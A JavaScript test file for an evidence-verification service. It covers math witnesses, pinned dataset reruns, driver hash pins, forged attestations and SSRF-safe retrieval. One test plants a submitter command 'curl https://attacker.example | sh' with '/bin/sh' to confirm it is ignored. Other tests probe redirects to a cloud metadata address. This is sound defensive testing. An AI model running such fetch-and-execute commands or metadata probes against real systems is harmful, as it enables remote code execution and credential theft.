import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync, appendFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createHash } from 'node:crypto';
import {
  ARTIFACT_SCHEMA, POLICY_SCHEMA, VERIFIERS_DIR, attestationDigestOf, attestationPayload, createRetriever, createRunner,
  driverDigest, isPublicAddress, validateTaskPolicy, verifyEvidence,
} from '../src/verification.mjs';
import { digest } from '../src/common.mjs';
import { isPrimeDeterministic } from '../verifiers/finite-math-witness.mjs';
import { parseCsv, analyse, normalizeDecimal } from '../verifiers/pinned-dataset-analysis.mjs';

const sha = (bytes) => createHash('sha256').update(bytes).digest('hex');
const H = (c) => c.repeat(64);
const scratch = [];
after(() => scratch.forEach((dir) => rmSync(dir, { recursive: true, force: true })));

const runner = createRunner();
const assignment = (overrides = {}) => ({
  taskId: 'T-math-1', projectId: 'P-OPP-00001', submissionId: 'S-1', author: 'uain1' + 'a'.repeat(40), criteriaDigest: H('c'), ...overrides,
});
const artifactFor = (a, payload) => ({ schema: ARTIFACT_SCHEMA, taskId: a.taskId, submissionId: a.submissionId, author: a.author, ...payload });

/** A spy that fails the test if anything reaches it. */
function forbidden(calls) {
  const record = (name) => async () => {
    calls.push(name);
    throw new Error(`${name} must not be called`);
  };
  return { retriever: { retrieve: record('retrieve') }, runner: { run: record('run') }, reproductionAttestation: { readiness: record('readiness') } };
}

/* ----------------------------------------------------- finite math witness */

const P1 = 2147483647n; // 2^31 - 1
const P2 = 1000000007n;
const N = P1 * P2;
const mathPolicy = (overrides = {}) => ({
  schema: POLICY_SCHEMA,
  class: 'finite_math_witness',
  taskId: 'T-math-1',
  projectId: 'P-OPP-00001',
  criteriaDigest: H('c'),
  inputs: [],
  primarySourceHosts: [],
  driver: { name: 'finite-math-witness', sha256: driverDigest('finite-math-witness') },
  successTests: [
    { id: 'factor', witnessType: 'integer_factorization', instance: { n: N.toString() } },
    { id: 'colour', witnessType: 'graph_coloring', instance: { vertices: 4, edges: [[0, 1], [1, 2], [2, 3], [3, 0]], k: 2 } },
    { id: 'sat', witnessType: 'sat_assignment', instance: { variables: 3, clauses: [[1, -2], [2, 3], [-1, -3]] } },
  ],
  ...overrides,
});
const trueWitnesses = () => ({
  factor: { factors: [P1.toString(), P2.toString()] },
  colour: { colors: [0, 1, 0, 1] },
  sat: { assignment: [true, true, false] },
});

test('a true finite mathematical witness passes through the pinned fixed driver with a bound attestation', async () => {
  const a = assignment();
  const artifact = artifactFor(a, { witnesses: trueWitnesses() });
  const result = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: a, artifact }, { runner });
  assert.equal(result.verdict, 'pass', result.findings.join());
  assert.deepEqual(result.findings, ['factor:pass', 'colour:pass', 'sat:pass']);
  assert.equal(result.mainKpiSatisfied, false);
  assert.equal(result.attestation.mainKpiSatisfied, false);
  const expected = attestationPayload({ policy: mathPolicy(), assignment: a, artifactDigest: digest(artifact), verdict: 'pass' });
  assert.deepEqual(result.attestation, expected);
  assert.equal(result.attestationDigest, attestationDigestOf(expected));
  assert.equal(result.attestation.policyDigest, digest(mathPolicy()));
  assert.deepEqual(result.attestation.driver, mathPolicy().driver);
});

test('false mathematical witnesses fail with a fail attestation and never pass', async () => {
  const a = assignment();
  const cases = [
    [{ factor: { factors: ['3', (N / 3n).toString()] } }, 'factor:fail:product_mismatch'],
    [{ factor: { factors: [N.toString()] } }, 'factor:fail:factors_not_nontrivial'],
    [{ factor: { factors: ['1', N.toString()] } }, 'factor:fail:invalid_factor'],
    [{ colour: { colors: [0, 0, 1, 1] } }, 'colour:fail:adjacent_vertices_share_color'],
    [{ colour: { colors: [0, 1, 0, 2] } }, 'colour:fail:invalid_coloring'],
    [{ sat: { assignment: [true, false, true] } }, 'sat:fail:clause_unsatisfied'],
    [{ sat: { assignment: [true, true] } }, 'sat:fail:invalid_assignment'],
    [{ sat: undefined }, 'sat:fail:witness_missing'],
  ];
  for (const [patch, finding] of cases) {
    const witnesses = { ...trueWitnesses(), ...patch };
    if (patch.sat === undefined && 'sat' in patch) delete witnesses.sat;
    const result = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: a, artifact: artifactFor(a, { witnesses }) }, { runner });
    assert.equal(result.verdict, 'fail', finding);
    assert.ok(result.findings.includes(finding), `${JSON.stringify(finding)} in ${result.findings.join()}`);
    assert.equal(result.attestation.verdict, 'fail');
    assert.equal(result.mainKpiSatisfied, false);
  }
  const composite = mathPolicy({ successTests: [{ id: 'factor', witnessType: 'integer_factorization', instance: { n: '105' } }] });
  const bad = await verifyEvidence({ taskPolicy: composite, assignment: a, artifact: artifactFor(a, { witnesses: { factor: { factors: ['15', '7'] } } }) }, { runner });
  assert.equal(bad.verdict, 'fail');
  assert.deepEqual(bad.findings, ['factor:fail:factor_not_prime']);
});

test('a factor beyond the deterministic primality bound is inconclusive, not a pass', async () => {
  const big = (1n << 89n) - 1n; // a Mersenne prime above the deterministic Miller-Rabin bound
  const small = (1n << 61n) - 1n;
  const policy = mathPolicy({ successTests: [{ id: 'factor', witnessType: 'integer_factorization', instance: { n: (big * small).toString() } }] });
  const a = assignment();
  const result = await verifyEvidence({ taskPolicy: policy, assignment: a, artifact: artifactFor(a, { witnesses: { factor: { factors: [big.toString(), small.toString()] } } }) }, { runner });
  assert.equal(result.verdict, 'needs_evidence');
  assert.equal(result.attestationDigest, null);
});

test('deterministic Miller-Rabin rejects Carmichael numbers and strong pseudoprimes', () => {
  for (const n of [561n, 2047n, 3215031751n, 3825123056546413051n, 1n, 0n]) assert.equal(isPrimeDeterministic(n), false, n.toString());
  for (const n of [2n, 3n, 41n, 43n, P1, P2, (1n << 61n) - 1n]) assert.equal(isPrimeDeterministic(n), true, n.toString());
  assert.equal(isPrimeDeterministic((1n << 89n) - 1n), null);
});

/* ------------------------------------------------- pinned dataset analysis */

const CSV = Buffer.from('site,cases,rate\nalpha,10,0.5\nbeta,20,"1.25"\n"gamma, west",7,\ndelta,3,-0.75\n');
const DATA_URL = 'https://data.example.org/releases/v3/sites.csv';
const datasetPolicy = (overrides = {}) => ({
  schema: POLICY_SCHEMA,
  class: 'pinned_dataset_analysis',
  taskId: 'T-data-1',
  projectId: 'P-OPP-00002',
  criteriaDigest: H('d'),
  inputs: [{ url: DATA_URL, sha256: sha(CSV), bytes: CSV.length }],
  primarySourceHosts: ['data.example.org'],
  driver: { name: 'pinned-dataset-analysis', sha256: driverDigest('pinned-dataset-analysis') },
  successTests: [
    { id: 'rows', op: 'count', input: 0, column: 'site', expected: '4' },
    { id: 'total', op: 'sum', input: 0, column: 'cases' },
    { id: 'mean-rate', op: 'mean', input: 0, column: 'rate', decimals: 4 },
    { id: 'low', op: 'min', input: 0, column: 'rate' },
    { id: 'high', op: 'max', input: 0, column: 'cases' },
  ],
  ...overrides,
});
const dataAssignment = (overrides = {}) => assignment({ taskId: 'T-data-1', projectId: 'P-OPP-00002', criteriaDigest: H('d'), ...overrides });
const trueResults = () => ({ rows: '4', total: '40', 'mean-rate': '0.3333', low: '-0.75', high: '20.0' });
const PUBLIC_DNS = async () => [{ address: '93.184.216.34', family: 4 }];

function servingRetriever(routes, { resolve = PUBLIC_DNS, calls = [] } = {}) {
  const fetchImpl = async (url, options) => {
    calls.push({ url, options });
    const route = routes[url];
    if (!route) return new Response('missing', { status: 404 });
    return typeof route === 'function' ? route() : new Response(route, { status: 200 });
  };
  return createRetriever({ fetchImpl, resolve, allowedHosts: ['data.example.org', 'mirror.example.org'] });
}

test('a pinned dataset analysis passes only through an independent fixed-driver rerun on the pinned bytes', async () => {
  const calls = [];
  const a = dataAssignment();
  const artifact = artifactFor(a, { results: trueResults() });
  const result = await verifyEvidence({ taskPolicy: datasetPolicy(), assignment: a, artifact },
    { retriever: servingRetriever({ [DATA_URL]: CSV }, { calls }), runner });
  assert.equal(result.verdict, 'pass', result.findings.join());
  assert.equal(result.mainKpiSatisfied, false);
  assert.equal(result.attestationDigest, attestationDigestOf(attestationPayload({ policy: datasetPolicy(), assignment: a, artifactDigest: digest(artifact), verdict: 'pass' })));
  assert.equal(calls.length, 1);
  assert.equal(calls[0].options.redirect, 'manual');
});

test('wrong claimed values or a policy-expected value that the rerun does not reproduce fail', async () => {
  const a = dataAssignment();
  const wrong = await verifyEvidence({ taskPolicy: datasetPolicy(), assignment: a, artifact: artifactFor(a, { results: { ...trueResults(), total: '41' } }) },
    { retriever: servingRetriever({ [DATA_URL]: CSV }), runner });
  assert.equal(wrong.verdict, 'fail');
  assert.ok(wrong.findings.includes('total:fail:claim_differs_from_rerun'));
  const policy = datasetPolicy();
  policy.successTests[1].expected = '39';
  const expected = await verifyEvidence({ taskPolicy: policy, assignment: a, artifact: artifactFor(a, { results: trueResults() }) },
    { retriever: servingRetriever({ [DATA_URL]: CSV }), runner });
  assert.equal(expected.verdict, 'fail');
  assert.ok(expected.findings.includes('total:fail:rerun_differs_from_expected'));
});

test('a mismatched dataset hash or version is refused and never reaches the driver', async () => {
  const a = dataAssignment();
  const tampered = Buffer.from(CSV);
  tampered[tampered.indexOf('10')] = '9'.charCodeAt(0); // same length, different bytes
  const newVersion = Buffer.concat([CSV, Buffer.from('epsilon,1,0\n')]);
  for (const [bytes, code] of [[tampered, 'hash_mismatch'], [newVersion, 'size_exceeded']]) {
    const runs = [];
    const result = await verifyEvidence({ taskPolicy: datasetPolicy(), assignment: a, artifact: artifactFor(a, { results: trueResults() }) },
      { retriever: servingRetriever({ [DATA_URL]: bytes }), runner: { run: async () => runs.push(1) } });
    assert.equal(result.verdict, 'needs_evidence');
    assert.deepEqual(result.findings, [`input_0_refused:${code}`]);
    assert.equal(result.attestationDigest, null);
    assert.equal(runs.length, 0);
  }
  const shorter = CSV.subarray(0, CSV.length - 1);
  await assert.rejects(servingRetriever({ [DATA_URL]: shorter }).retrieve(datasetPolicy().inputs[0], { hosts: ['data.example.org'] }),
    (e) => e.code === 'size_mismatch');
});

test('the dataset driver parses strict CSV and computes exact decimals', () => {
  const table = parseCsv(CSV);
  assert.deepEqual(table.header, ['site', 'cases', 'rate']);
  assert.equal(table.data[2][0], 'gamma, west');
  assert.equal(analyse(table, { op: 'mean', column: 'rate', decimals: 2 }), '0.33');
  assert.equal(analyse(table, { op: 'count', column: 'rate' }), '3');
  assert.equal(analyse(parseCsv(Buffer.from('x\n0.1\n0.2\n')), { op: 'sum', column: 'x' }), '0.3');
  assert.equal(normalizeDecimal('-0.000'), '0');
  assert.throws(() => parseCsv(Buffer.from('a,b\n1\n')), /ragged_row/);
  assert.throws(() => parseCsv(Buffer.from('a\n"open\n')), /malformed_csv/);
  assert.throws(() => analyse(parseCsv(Buffer.from('x\n1e3\n')), { op: 'sum', column: 'x' }), /non_numeric_cell/);
});

/* ------------------------------------------------------------ driver pins */

test('driverDigest is the sha256 of the fixed driver file', () => {
  for (const name of ['finite-math-witness', 'pinned-dataset-analysis']) {
    assert.equal(driverDigest(name), sha(readFileSync(join(VERIFIERS_DIR, `${name}.mjs`))));
  }
  assert.throws(() => driverDigest('../src/common'), (e) => e.code === 'unknown_driver');
});

test('a changed driver is refused before it runs, even one rewritten to always pass', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'uain-verifiers-'));
  scratch.push(dir);
  cpSync(VERIFIERS_DIR, dir, { recursive: true });
  const a = assignment();
  const artifact = artifactFor(a, { witnesses: { ...trueWitnesses(), factor: { factors: ['3', '5'] } } });

  appendFileSync(join(dir, 'finite-math-witness.mjs'), '\n// edited\n');
  const edited = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: a, artifact }, { runner: createRunner({ directory: dir }) });
  assert.equal(edited.verdict, 'fail');
  assert.deepEqual(edited.findings, ['driver_hash_mismatch']);
  assert.equal(edited.attestationDigest, null);

  writeFileSync(join(dir, 'finite-math-witness.mjs'), "export function verify() { return { status: 'pass', findings: ['ok'] }; }\n");
  const evil = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: a, artifact }, { runner: createRunner({ directory: dir }) });
  assert.equal(evil.verdict, 'fail');
  assert.deepEqual(evil.findings, ['driver_hash_mismatch']);

  const stalePin = mathPolicy({ driver: { name: 'finite-math-witness', sha256: H('e') } });
  const stale = await verifyEvidence({ taskPolicy: stalePin, assignment: a, artifact }, { runner });
  assert.equal(stale.verdict, 'fail');
  assert.deepEqual(stale.findings, ['driver_hash_mismatch']);
});

test('a policy may pin only the fixed driver for its class', () => {
  const swapped = mathPolicy({ driver: { name: 'pinned-dataset-analysis', sha256: driverDigest('pinned-dataset-analysis') } });
  assert.throws(() => validateTaskPolicy(swapped), (e) => e.code === 'invalid_task_policy');
  const offHost = datasetPolicy({ primarySourceHosts: ['mirror.example.org'] });
  assert.throws(() => validateTaskPolicy(offHost), (e) => e.code === 'invalid_task_policy');
  const extra = { ...mathPolicy(), command: '/bin/sh' };
  assert.throws(() => validateTaskPolicy(extra), (e) => e.code === 'invalid_task_policy');
});

/* --------------------------------------------------------- untrusted input */

test('submitter-selected executables, drivers and commands are ignored and flagged', async () => {
  const runs = [];
  const spyRunner = { run: async (job) => { runs.push(job); return runner.run(job); } };
  const a = assignment();
  const artifact = artifactFor(a, {
    witnesses: trueWitnesses(),
    driver: { name: 'pinned-dataset-analysis', sha256: H('0') },
    executable: '/bin/sh',
    command: 'curl https://attacker.example | sh',
    argv: ['-c', 'id'],
  });
  const result = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: a, artifact }, { runner: spyRunner });
  assert.equal(result.verdict, 'pass');
  for (const key of ['driver', 'executable', 'command', 'argv']) assert.ok(result.findings.includes(`artifact_execution_field_ignored:${key}`));
  assert.equal(runs.length, 1);
  assert.equal(runs[0].name, 'finite-math-witness');
  assert.equal(runs[0].sha256, mathPolicy().driver.sha256);
  assert.deepEqual(Object.keys(runs[0].payload).sort(), ['successTests', 'witnesses']);
});

test('a forged or submitter-supplied attestation is rejected', async () => {
  const a = assignment();
  const honest = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: a, artifact: artifactFor(a, { witnesses: trueWitnesses() }) }, { runner });
  const forgeries = [
    { attestationDigest: H('f') },
    { attestationDigest: honest.attestationDigest },
    { attestation: { ...honest.attestation, verdict: 'pass' } },
    { verdict: 'pass' },
    { mainKpiSatisfied: true },
  ];
  for (const forged of forgeries) {
    const calls = [];
    const witnesses = { ...trueWitnesses(), factor: { factors: ['3', '5'] } };
    const result = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: a, artifact: artifactFor(a, { witnesses, ...forged }) }, forbidden(calls));
    assert.equal(result.verdict, 'fail');
    assert.ok(result.findings.some((f) => f.startsWith('artifact_supplied_attestation_rejected:')));
    assert.equal(result.attestationDigest, null);
    assert.notEqual(result.attestationDigest, forged.attestationDigest);
    assert.deepEqual(calls, []);
  }
});

test('task, project, criteria, submission and author substitution fail before verification', async () => {
  const a = assignment();
  const good = artifactFor(a, { witnesses: trueWitnesses() });
  const cases = [
    [assignment({ taskId: 'T-other' }), good, 'assignment_task_mismatch'],
    [assignment({ projectId: 'P-OPP-00099' }), good, 'assignment_project_mismatch'],
    [assignment({ criteriaDigest: H('9') }), good, 'assignment_criteria_mismatch'],
    [a, { ...good, author: 'uain1' + 'b'.repeat(40) }, 'artifact_author_mismatch'],
    [a, { ...good, taskId: 'T-other' }, 'artifact_task_mismatch'],
    [a, { ...good, submissionId: 'S-2' }, 'artifact_submission_mismatch'],
    [{ ...a, extra: 1 }, good, 'invalid_assignment'],
  ];
  for (const [who, artifact, finding] of cases) {
    const calls = [];
    const result = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: who, artifact }, forbidden(calls));
    assert.equal(result.verdict, 'fail', finding);
    assert.ok(result.findings.includes(finding), `${String(finding)} in ${result.findings.join()}`);
    assert.equal(result.attestationDigest, null);
    assert.deepEqual(calls, []);
  }
  // The same valid evidence by another author yields a different attestation.
  const b = assignment({ author: 'uain1' + 'b'.repeat(40) });
  const first = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: a, artifact: good }, { runner });
  const second = await verifyEvidence({ taskPolicy: mathPolicy(), assignment: b, artifact: artifactFor(b, { witnesses: trueWitnesses() }) }, { runner });
  assert.equal(first.verdict, 'pass');
  assert.equal(second.verdict, 'pass');
  assert.notEqual(first.attestationDigest, second.attestationDigest);
});

test('unsupported wet-lab, clinical, patient-count, narrative and unknown classes need an adapter before any expense', async () => {
  for (const cls of ['wet_lab', 'clinical', 'clinical_efficacy', 'patient_counts', 'narrative_literature', 'quantum_gravity', 'Bad Class!']) {
    const calls = [];
    const policy = { schema: POLICY_SCHEMA, class: cls, taskId: 'T-1', anything: { url: 'http://10.0.0.1/' } };
    const result = await verifyEvidence({ taskPolicy: policy, assignment: assignment(), artifact: { command: 'run me' } }, forbidden(calls));
    assert.equal(result.verdict, 'verification_adapter_required', cls);
    assert.equal(result.attestationDigest, null);
    assert.equal(result.mainKpiSatisfied, false);
    assert.deepEqual(calls, [], cls);
  }
  const narrative = await verifyEvidence({ taskPolicy: { schema: POLICY_SCHEMA, class: 'narrative_literature' }, assignment: {}, artifact: {} }, {});
  assert.ok(narrative.findings.includes('narrative literature notes remain unpaid preparation'));
});

/* ---------------------------------------------------------- SSRF guards */

test('isPublicAddress refuses private, loopback, link-local, CGNAT, ULA and special ranges', () => {
  const refused = ['10.1.2.3', '127.0.0.1', '169.254.169.254', '172.16.0.1', '172.31.255.255', '192.168.1.1', '100.64.0.1',
    '100.127.255.255', '0.0.0.0', '224.0.0.1', '255.255.255.255', '198.18.0.1', '::1', '::', 'fd00::1', 'fc00::1', 'fe80::1',
    'ff02::1', '::ffff:127.0.0.1', '::ffff:10.0.0.1', '::ffff:7f00:1', '64:ff9b::a00:1', '2001:db8::1', '2002:a00:1::1', '::127.0.0.1',
    'not-an-ip', ''];
  for (const address of refused) assert.equal(isPublicAddress(address), false, address);
  for (const address of ['93.184.216.34', '8.8.8.8', '172.32.0.1', '100.128.0.1', '2606:4700::1111', '::ffff:93.184.216.34']) {
    assert.equal(isPublicAddress(address), true, address);
  }
});

test('retrieval refuses http, IP literals, credentials, odd ports and hosts that are not pinned primary sources', async () => {
  const calls = [];
  const retriever = servingRetriever({}, { calls });
  const pin = (url) => ({ url, sha256: sha(CSV), bytes: CSV.length });
  const hosts = ['data.example.org'];
  const cases = [
    ['http://data.example.org/sites.csv', 'https_required'],
    ['https://127.0.0.1/sites.csv', 'ip_literal_refused'],
    ['https://[::1]/sites.csv', 'ip_literal_refused'],
    ['https://user:pw@data.example.org/sites.csv', 'credentials_in_url'],
    ['https://data.example.org:8443/sites.csv', 'port_refused'],
    ['https://evil.example.net/sites.csv', 'host_not_allowed'],
    ['https://mirror.example.org/sites.csv', 'host_not_allowed'], // globally allowed but not this task's primary source
  ];
  for (const [url, code] of cases) await assert.rejects(retriever.retrieve(pin(url), { hosts }), (e) => e.code === code, url);
  assert.equal(calls.length, 0);
});

test('retrieval refuses hosts that resolve to private addresses after DNS, before connecting', async () => {
  for (const answers of [
    [{ address: '10.0.0.5', family: 4 }],
    [{ address: '169.254.169.254', family: 4 }],
    [{ address: '100.64.3.4', family: 4 }],
    [{ address: 'fd12:3456::1', family: 6 }],
    [{ address: '::ffff:127.0.0.1', family: 6 }],
    [{ address: '93.184.216.34', family: 4 }, { address: '127.0.0.1', family: 4 }],
    [],
  ]) {
    const calls = [];
    const retriever = servingRetriever({ [DATA_URL]: CSV }, { resolve: async () => answers, calls });
    await assert.rejects(retriever.retrieve(datasetPolicy().inputs[0], { hosts: ['data.example.org'] }),
      (e) => ['private_address_refused', 'dns_failed'].includes(e.code), JSON.stringify(answers));
    assert.equal(calls.length, 0);
  }
  const runs = [];
  const a = dataAssignment();
  const result = await verifyEvidence({ taskPolicy: datasetPolicy(), assignment: a, artifact: artifactFor(a, { results: trueResults() }) },
    { retriever: servingRetriever({ [DATA_URL]: CSV }, { resolve: async () => [{ address: '192.168.0.10', family: 4 }] }), runner: { run: async () => runs.push(1) } });
  assert.equal(result.verdict, 'needs_evidence');
  assert.deepEqual(result.findings, ['input_0_refused:private_address_refused']);
  assert.equal(runs.length, 0);
});

test('redirects are followed manually and only to approved https hosts with public addresses', async () => {
  const redirect = (location) => () => new Response(null, { status: 302, headers: { location } });
  const hosts = ['data.example.org', 'mirror.example.org'];
  const input = datasetPolicy().inputs[0];

  const toEvil = servingRetriever({ [DATA_URL]: redirect('https://evil.example.net/sites.csv') });
  await assert.rejects(toEvil.retrieve(input, { hosts }), (e) => e.code === 'redirect_host_not_allowed');
  const toMetadata = servingRetriever({ [DATA_URL]: redirect('https://169.254.169.254/latest/meta-data/') });
  await assert.rejects(toMetadata.retrieve(input, { hosts }), (e) => e.code === 'ip_literal_refused');
  const toHttp = servingRetriever({ [DATA_URL]: redirect('http://mirror.example.org/sites.csv') });
  await assert.rejects(toHttp.retrieve(input, { hosts }), (e) => e.code === 'https_required');
  const notTaskHost = servingRetriever({ [DATA_URL]: redirect('https://mirror.example.org/sites.csv') });
  await assert.rejects(notTaskHost.retrieve(input, { hosts: ['data.example.org'] }), (e) => e.code === 'redirect_host_not_allowed');

  const resolveMirrorPrivate = async (host) => [{ address: host === 'mirror.example.org' ? '10.9.9.9' : '93.184.216.34', family: 4 }];
  const rebound = servingRetriever({ [DATA_URL]: redirect('https://mirror.example.org/sites.csv'), 'https://mirror.example.org/sites.csv': CSV },
    { resolve: resolveMirrorPrivate });
  await assert.rejects(rebound.retrieve(input, { hosts }), (e) => e.code === 'private_address_refused');

  const loop = servingRetriever({ [DATA_URL]: redirect(DATA_URL) });
  await assert.rejects(loop.retrieve(input, { hosts }), (e) => e.code === 'too_many_redirects');

  const calls = [];
  const approved = servingRetriever({ [DATA_URL]: redirect('/releases/v3/mirror.csv'), 'https://data.example.org/releases/v3/mirror.csv': CSV }, { calls });
  assert.deepEqual(await approved.retrieve(input, { hosts }), CSV);
  assert.ok(calls.every((c) => c.options.redirect === 'manual'));
});

test('retrieval caps bytes by the pinned size, declared or streamed', async () => {
  const input = datasetPolicy().inputs[0];
  const hosts = ['data.example.org'];
  const declared = servingRetriever({ [DATA_URL]: () => new Response(CSV, { status: 200, headers: { 'content-length': String(CSV.length + 1) } }) });
  await assert.rejects(declared.retrieve(input, { hosts }), (e) => e.code === 'size_exceeded');
  const streamed = servingRetriever({ [DATA_URL]: Buffer.alloc(10 * CSV.length, 65) });
  await assert.rejects(streamed.retrieve(input, { hosts }), (e) => e.code === 'size_exceeded');
  const status = servingRetriever({ [DATA_URL]: () => new Response(CSV, { status: 203 }) });
  await assert.rejects(status.retrieve(input, { hosts }), (e) => e.code === 'unexpected_status');
});

/* ------------------------------------------- source-code reproduction */

const REPRODUCER = H('1');
const LIVE_SOURCE = H('2');
const EVIDENCE = H('5');
const sourcePolicy = (overrides = {}) => ({
  schema: POLICY_SCHEMA,
  class: 'source_code_reproduction',
  taskId: 'T-src-1',
  projectId: 'P-OPP-00003',
  criteriaDigest: H('e'),
  inputs: [{ url: 'https://git.example.org/uain/native/blob/main/ledger.rs', sha256: LIVE_SOURCE, bytes: 4096 }],
  primarySourceHosts: ['git.example.org'],
  driver: { name: 'protected-reproduction-attestation', sha256: REPRODUCER },
  successTests: [{ id: 'reproduction', before: 'failed', after: 'passed' }],
  ...overrides,
});
const srcAssignment = (overrides = {}) => assignment({ taskId: 'T-src-1', projectId: 'P-OPP-00003', criteriaDigest: H('e'), ...overrides });
const summary = (overrides = {}) => ({
  schema: 'uain-trusted-reproduction-v1', digest: H('a'), native_binary_sha256: H('3'), live_source_sha256: LIVE_SOURCE,
  corrected_source_sha256: H('4'), reproducer_sha256: REPRODUCER, before_outcome: 'failed', after_outcome: 'passed',
  reviewed_at: '2026-11-06T10:00:00Z', review_notes: 'Root reviewer reran the pinned reproducer before and after.', ...overrides,
});
/** Stands in for the existing custody readiness endpoint; echoes what custody bound natively. */
function custody(respond) {
  const calls = [];
  return { calls, readiness: async (request) => { calls.push(request); return respond(request); } };
}
const readyFor = (request, overrides = {}) => ({
  ready: true, required: true, submission: request.submission, author: request.author, criteriaDigest: request.criteriaDigest,
  evidenceDigest: request.evidenceDigest, attestationDigest: H('a'), trusted_reproduction: summary(), ...overrides,
});

test('source-code reproduction passes only with the existing protected attestation bound to the submission', async () => {
  const a = srcAssignment();
  const artifact = artifactFor(a, { evidenceDigest: EVIDENCE });
  const checker = custody((r) => readyFor(r));
  const calls = [];
  const result = await verifyEvidence({ taskPolicy: sourcePolicy(), assignment: a, artifact },
    { ...forbidden(calls), reproductionAttestation: checker });
  assert.equal(result.verdict, 'pass', result.findings.join());
  assert.deepEqual(calls, []); // no retrieval or driver run of its own
  assert.deepEqual(checker.calls, [{ submission: 'S-1', author: a.author, criteriaDigest: H('e'), evidenceDigest: EVIDENCE }]);
  assert.equal(result.attestation.reproductionAttestationDigest, H('a'));
  assert.equal(result.attestation.mainKpiSatisfied, false);
  assert.equal(result.attestationDigest, attestationDigestOf(attestationPayload({
    policy: sourcePolicy(), assignment: a, artifactDigest: digest(artifact), verdict: 'pass', reproductionAttestationDigest: H('a'),
  })));
});

test('source-code reproduction without a valid bound protected attestation needs evidence', async () => {
  const a = srcAssignment();
  const artifact = artifactFor(a, { evidenceDigest: EVIDENCE });
  const cases = [
    [(r) => ({ ...readyFor(r), ready: false, trusted_reproduction: undefined }), 'independent_reproduction_required'],
    [(r) => { const v = readyFor(r); delete v.trusted_reproduction; return v; }, 'independent_reproduction_required'],
    [(r) => readyFor(r, { author: 'uain1' + 'b'.repeat(40) }), 'protected_reproduction_binding_mismatch'],
    [(r) => readyFor(r, { submission: 'S-9' }), 'protected_reproduction_binding_mismatch'],
    [(r) => readyFor(r, { criteriaDigest: H('9') }), 'protected_reproduction_binding_mismatch'],
    [(r) => readyFor(r, { evidenceDigest: H('6') }), 'protected_reproduction_binding_mismatch'],
    [(r) => readyFor(r, { attestationDigest: H('b') }), 'protected_reproduction_digest_mismatch'],
    [(r) => readyFor(r, { trusted_reproduction: summary({ after_outcome: 'failed' }) }), 'protected_reproduction_invalid'],
    [() => { throw new Error('socket down'); }, 'protected_reproduction_unavailable'],
  ];
  for (const [respond, finding] of cases) {
    const result = await verifyEvidence({ taskPolicy: sourcePolicy(), assignment: a, artifact }, { reproductionAttestation: custody(respond) });
    assert.equal(result.verdict, 'needs_evidence', finding);
    assert.deepEqual(result.findings, [finding]);
    assert.equal(result.attestationDigest, null);
  }
  const missing = await verifyEvidence({ taskPolicy: sourcePolicy(), assignment: a, artifact }, {});
  assert.deepEqual([missing.verdict, missing.findings], ['needs_evidence', ['protected_reproduction_checker_unavailable']]);
});

test('a protected reproduction of a different reproducer or live source than the policy pins fails', async () => {
  const a = srcAssignment();
  const artifact = artifactFor(a, { evidenceDigest: EVIDENCE });
  const otherReproducer = await verifyEvidence({ taskPolicy: sourcePolicy(), assignment: a, artifact },
    { reproductionAttestation: custody((r) => readyFor(r, { trusted_reproduction: summary({ reproducer_sha256: H('7') }) })) });
  assert.deepEqual([otherReproducer.verdict, otherReproducer.findings], ['fail', ['reproducer_not_pinned_by_policy']]);
  const otherSource = await verifyEvidence({ taskPolicy: sourcePolicy(), assignment: a, artifact },
    { reproductionAttestation: custody((r) => readyFor(r, { trusted_reproduction: summary({ live_source_sha256: H('8') }) })) });
  assert.deepEqual([otherSource.verdict, otherSource.findings], ['fail', ['live_source_not_pinned_by_policy']]);
});

test('a submitter cannot supply its own trusted reproduction or reproducer', async () => {
  const a = srcAssignment();
  const checker = custody((r) => readyFor(r));
  const forged = await verifyEvidence({ taskPolicy: sourcePolicy(), assignment: a,
    artifact: artifactFor(a, { evidenceDigest: EVIDENCE, trusted_reproduction: summary() }) }, { reproductionAttestation: checker });
  assert.equal(forged.verdict, 'fail');
  assert.ok(forged.findings.includes('artifact_supplied_attestation_rejected:trusted_reproduction'));
  assert.equal(checker.calls.length, 0);
  const flagged = await verifyEvidence({ taskPolicy: sourcePolicy(), assignment: a,
    artifact: artifactFor(a, { evidenceDigest: EVIDENCE, reproducer: { path: '/tmp/x', sha256: H('7') } }) }, { reproductionAttestation: checker });
  assert.equal(flagged.verdict, 'pass');
  assert.ok(flagged.findings.includes('artifact_execution_field_ignored:reproducer'));
});
